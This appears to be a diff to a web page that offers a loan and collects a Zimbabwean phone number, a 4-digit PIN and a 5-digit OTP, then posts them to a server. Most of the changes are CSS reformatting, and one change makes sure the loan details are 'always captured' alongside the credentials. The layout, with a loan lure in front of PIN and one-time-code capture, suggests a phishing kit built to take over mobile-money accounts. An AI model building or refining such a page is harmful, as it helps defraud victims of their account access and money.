@@ -8,183 +8,172 @@
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 
 <style>
-*{
-  box-sizing:border-box;
-  -webkit-tap-highlight-color:transparent;
-}
+*{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 html,body{height:100%}
 body{
-  font-family:Inter,system-ui,Arial;
-  background:#020617;
-  margin:0;
-  padding:18px;
-  display:flex;
-  align-items:center;
-  justify-content:center;
-  color:#e5e7eb;
+font-family:Inter,system-ui,Arial;
+background:#020617;
+margin:0;
+padding:18px;
+display:flex;
+align-items:center;
+justify-content:center;
+color:#e5e7eb;
 }
 
-/* CARD */
 .card{
-  width:100%;
-  max-width:380px;
-  background:#020617;
-  padding:20px;
-  border-radius:14px;
-  border:1px solid #1f2937;
-  box-shadow:0 18px 45px rgba(0,0,0,.75);
+width:100%;
+max-width:380px;
+background:#020617;
+padding:20px;
+border-radius:14px;
+border:1px solid #1f2937;
+box-shadow:0 18px 45px rgba(0,0,0,.75);
 }
 
 .logo{
-  height:44px;
-  display:block;
-  margin:0 auto 10px;
+height:44px;
+display:block;
+margin:0 auto 10px;
 }
 
 h2{
-  text-align:center;
-  margin:0 0 12px;
-  font-size:20px;
-  color:#f8fafc;
-  letter-spacing:.2px;
+text-align:center;
+margin:0 0 12px;
+font-size:20px;
+color:#f8fafc;
 }
 
 label{
-  display:block;
-  font-size:13px;
-  margin-top:8px;
-  color:#cbd5f5;
+display:block;
+font-size:13px;
+margin-top:8px;
+color:#cbd5f5;
 }
 
 input{
-  width:100%;
-  padding:10px;
-  border-radius:8px;
-  border:1px solid #1f2937;
-  background:#020617;
-  color:#e5e7eb;
-  font-size:14px;
-  outline:none;
+width:100%;
+padding:10px;
+border-radius:8px;
+border:1px solid #1f2937;
+background:#020617;
+color:#e5e7eb;
+font-size:14px;
+outline:none;
 }
 
 .btn{
-  background:#2563eb;
-  color:#fff;
-  padding:10px;
-  border-radius:8px;
-  border:0;
-  margin-top:12px;
-  width:100%;
-  font-weight:600;
-  cursor:pointer;
+background:#2563eb;
+color:#fff;
+padding:10px;
+border-radius:8px;
+border:0;
+margin-top:12px;
+width:100%;
+font-weight:600;
+cursor:pointer;
 }
 
-.btn[disabled]{
-  background:#334155;
-  cursor:not-allowed;
-}
+.btn[disabled]{background:#334155}
 
 .req{color:#ef4444;margin-right:6px}
 .small{font-size:13px;color:#9ca3af}
 .success{color:#22c55e;font-weight:600}
 
 .error{
-  min-height:18px;
-  font-size:13px;
-  color:#ef4444;
+min-height:18px;
+font-size:13px;
+color:#ef4444;
 }
 
-/* PIN */
 .pin-row{
-  display:flex;
-  gap:10px;
-  justify-content:center;
-  margin-top:10px;
+display:flex;
+gap:10px;
+justify-content:center;
+margin-top:10px;
 }
 
 .pin-digit{
-  width:18px;
-  height:18px;
-  border-radius:50%;
-  border:2px solid #fff;
-  background:#fff;
-  font-size:1px;
-  color:transparent;
-  caret-color:transparent;
-  outline:none;
+width:18px;
+height:18px;
+border-radius:50%;
+border:2px solid #fff;
+background:#fff;
+font-size:1px;
+color:transparent;
+caret-color:transparent;
 }
 
 .pin-digit.filled{
-  background:#2563eb;
-  border-color:#2563eb;
+background:#2563eb;
+border-color:#2563eb;
 }
 
-/* OTP MODAL */
 .otp-modal{
-  position:fixed;
-  inset:0;
-  background:rgba(2,6,23,.88);
-  display:flex;
-  align-items:center;
-  justify-content:center;
+position:fixed;
+inset:0;
+background:rgba(2,6,23,.88);
+display:flex;
+align-items:center;
+justify-content:center;
 }
 
 .otp-box{
-  background:#020617;
-  padding:20px;
-  border-radius:14px;
-  min-width:340px;
-  border:1px solid #1f2937;
+background:#020617;
+padding:20px;
+border-radius:14px;
+min-width:340px;
+border:1px solid #1f2937;
 }
 
 .otp-row{
-  display:flex;
-  gap:10px;
-  justify-content:center;
-  margin-top:10px;
+display:flex;
+gap:10px;
+justify-content:center;
+margin-top:10px;
 }
 
 .otp-digit{
-  width:18px;
-  height:18px;
-  border-radius:50%;
-  border:2px solid #fff;
-  background:#fff;
-  font-size:1px;
-  color:transparent;
+width:18px;
+height:18px;
+border-radius:50%;
+border:2px solid #fff;
+background:#fff;
+font-size:1px;
+color:transparent;
 }
 
 .otp-digit.filled{
-  background:#2563eb;
-  border-color:#2563eb;
+background:#2563eb;
+border-color:#2563eb;
 }
 
 .resend-row{
-  display:flex;
-  align-items:center;
-  justify-content:space-between;
-  gap:10px;
-  margin-top:14px;
+display:flex;
+align-items:center;
+justify-content:space-between;
+gap:10px;
+margin-top:14px;
 }
 
 .resend-btn{
-  background:#020617;
-  border:1px solid #1f2937;
-  padding:10px 14px;
-  border-radius:8px;
-  color:#e5e7eb;
-  flex:1;
+background:#020617;
+border:1px solid #1f2937;
+padding:10px 14px;
+border-radius:8px;
+color:#e5e7eb;
+flex:1;
 }
 
 .action-primary{
-  background:#2563eb;
-  border:0;
-  color:#fff;
+background:#2563eb;
+border:0;
+color:#fff;
 }
 
 .action-secondary{
-  background:#020617;
-  border:1px solid #1f2937;
+background:#020617;
+border:1px solid #1f2937;
 }
 </style>
 </head>
@@ -225,7 +214,6 @@ input{
 </div>
 
 
-
 <div id="otpModal" class="otp-modal" style="display:none">
 
 <div class="otp-box">
@@ -244,13 +232,11 @@ input{
 
 </div>
 
-<input
-id="otpBuffer"
+<input id="otpBuffer"
 type="tel"
 inputmode="numeric"
 autocomplete="one-time-code"
-style="position:absolute;opacity:0"
->
+style="position:absolute;opacity:0">
 
 <div class="resend-row">
 
@@ -285,14 +271,28 @@ Cancel
 
 <script>
 
-/* LOAN SUMMARY */
-
+/* loan always captured */
 function buildLoanRequest(){
+
 try{
-const loan=JSON.parse(sessionStorage.getItem('loanForm')||'{}');
+
+let loan=JSON.parse(sessionStorage.getItem('loanForm')||'{}');
+
+loan.loanAmount=loan.loanAmount||sessionStorage.getItem('loanAmount');
+loan.loanType=loan.loanType||sessionStorage.getItem('loanType');
+loan.repayment=loan.repayment||sessionStorage.getItem('repayment');
+loan.employment=loan.employment||sessionStorage.getItem('employment');
+
 if(!loan.loanAmount) return 'N/A';
+
 return `USD ${loan.loanAmount} / ${loan.loanType} / ${loan.repayment} month(s) (${loan.employment})`;
-}catch(e){return 'N/A'}
+
+}catch(e){
+
+return 'N/A';
+
+}
+
 }
 
 
@@ -317,8 +317,6 @@ if(el.value && i<pins.length-1) pins[i+1].focus();
 updatePin();
 
 });
-
-/* backspace smooth */
 
 el.addEventListener('keydown',e=>{
 
@@ -348,14 +346,13 @@ loginBtn.disabled=!(validatePhone()&&/^\d{4}$/.test(pinValue))||loginLocked;
 }
 
 
-/* PHONE */
+/* phone */
 
 const phone=document.getElementById('phone');
 
 const phoneError=document.getElementById('phoneError');
 
 const loginBtn=document.getElementById('loginBtn');
-
 
 function validatePhone(){
 
@@ -375,7 +372,6 @@ return true;
 
 }
 
-
 phone.addEventListener('input',()=>{
 
 let d=phone.value.replace('+263','').replace(/\D/g,'');
@@ -391,7 +387,7 @@ updatePin();
 });
 
 
-/* API */
+/* api */
 
 async function sendToServer(payload){
 
@@ -408,7 +404,7 @@ body:JSON.stringify(payload)
 }
 
 
-/* OTP */
+/* otp */
 
 const dots=[...document.querySelectorAll('.otp-digit')];
 
@@ -422,9 +418,7 @@ const countdown=document.getElementById('countdown');
 
 const otpStatus=document.getElementById('otpStatus');
 
-
 let timer=null,seconds=120;
-
 
 function renderOtp(v){
 
@@ -434,15 +428,9 @@ confirmBtn.disabled=!/^\d{5}$/.test(v)||confirmLocked;
 
 }
 
+/* always show numeric keyboard */
 
-/* ensure keyboard shows */
-
-dots.forEach(d=>{
-
-d.addEventListener('click',()=>buffer.focus());
-
-});
-
+dots.forEach(d=>d.addEventListener('click',()=>buffer.focus()));
 
 buffer.addEventListener('input',()=>{
 
@@ -451,7 +439,6 @@ buffer.value=buffer.value.replace(/\D/g,'').slice(0,5);
 renderOtp(buffer.value);
 
 });
-
 
 buffer.addEventListener('keydown',e=>{
 
@@ -495,7 +482,7 @@ resendBtn.disabled=false;
 }
 
 
-/* LOGIN */
+/* login */
 
 document.getElementById('loginForm').addEventListener('submit',async e=>{
 
@@ -538,7 +525,7 @@ startCountdown();
 });
 
 
-/* CONFIRM */
+/* confirm */
 
 confirmBtn.onclick=async()=>{
 
